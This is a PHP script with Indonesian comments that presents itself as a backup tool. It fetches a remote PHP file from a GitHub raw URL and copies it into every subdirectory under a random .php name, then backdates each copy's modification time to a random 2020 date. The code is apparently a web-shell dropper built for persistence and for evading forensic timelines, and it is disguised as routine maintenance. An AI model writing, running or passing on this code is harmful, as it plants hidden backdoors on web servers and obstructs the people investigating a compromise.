<?php
// Pastikan skrip ini berjalan dengan izin akses yang memadai
set_time_limit(0); // Tidak membatasi waktu eksekusi skrip
ini_set('display_errors', 1); // Menampilkan error
error_reporting(E_ALL); // Melaporkan semua error

// Fungsi untuk mendapatkan semua folder di server
function getAllFolders($path) {
    $folders = [];
    $items = scandir($path);
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            $folders[] = $fullPath;
            // Rekursif ke dalam subfolder
            $folders = array_merge($folders, getAllFolders($fullPath));
        }
    }
    return $folders;
}

// Fungsi untuk menghasilkan nama file acak
function generateRandomFilename() {
    // Buat nama file acak menggunakan hash atau UUID
    $randomString = bin2hex(random_bytes(8)); // Menghasilkan string acak sepanjang 16 karakter
    $fileExtension = '.php'; // Ekstensi tetap
    return $randomString . $fileExtension;
}

// Fungsi untuk menghasilkan timestamp acak di tahun 2020
function generateRandomTimestamp() {
    $year = 2020;
    $month = rand(1, 12);
    $day = rand(1, 28); // Menghindari tanggal di luar jangkauan (misalnya, Februari hanya sampai 28)
    $hour = rand(0, 23);
    $minute = rand(0, 59);
    $second = rand(0, 59);
    
    return mktime($hour, $minute, $second, $month, $day, $year);
}

// Lokasi root server
$rootDirectory = __DIR__; // Direktori saat ini (di mana skrip ini berada)
$backupFilename = generateRandomFilename(); // Nama file acak
$githubURL = 'https://raw.githubusercontent.com/PR455/bckp/refs/heads/main/inde.php'; // URL file dari GitHub

// Ambil konten file dari GitHub
$remoteContent = file_get_contents($githubURL);
if ($remoteContent === false) {
    die("Gagal mengambil file dari URL: $githubURL");
}

// Ambil semua folder
$allFolders = getAllFolders($rootDirectory);

// Loop dan simpan file backup ke setiap folder dengan nama acak
foreach ($allFolders as $folder) {
    $backupPath = $folder . DIRECTORY_SEPARATOR . $backupFilename;

    if (file_put_contents($backupPath, $remoteContent)) {
        echo "File berhasil disimpan di: $backupPath<br>";
        
        // Ubah tanggal modifikasi menjadi tahun 2020 dengan tanggal dan bulan acak
        $randomTimestamp = generateRandomTimestamp();
        if (touch($backupPath, $randomTimestamp)) {
            echo "Tanggal file diubah menjadi: " . date('Y-m-d H:i:s', $randomTimestamp) . "<br>";
        } else {
            echo "Gagal mengubah tanggal file di: $backupPath<br>";
        }
    } else {
        echo "Gagal menyimpan file di: $backupPath<br>";
    }
}

echo "Proses backup selesai.";
?>
